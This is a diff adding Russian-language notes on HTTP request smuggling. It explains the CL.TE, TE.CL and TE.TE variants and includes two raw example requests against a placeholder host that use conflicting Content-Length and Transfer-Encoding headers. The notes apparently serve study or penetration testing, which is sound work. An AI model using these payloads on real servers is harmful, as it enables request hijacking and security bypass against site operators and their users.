@@ -19,6 +19,44 @@
 * Некоторые HTTP сервера не поддерживают TE заголовок
 * Другие могут его игнорировать при использовании некоторых кодирований/обфускации
 
+### Направления проверок
+
+* CL.TE: фронт использует CL, бэк — TE
+* TE.CL: фронт использует TE, бэк — CL
+* TE.TE: и фронт и бэк используют TE, но они по разному реагируют на обфускацию заголовков
+
+### CL.TE
+
+Пример запроса
+
+```
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED
+```
+
+### TE.CL
+
+Пример запроса
+
+```
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 3
+Transfer-Encoding: chunked
+
+8
+SMUGGLED
+0
+
+
+```
+
 ### Другой пример
 
 Использование двух Content-Length - где-то может взяться первый content-length, а на другом серваке - второй
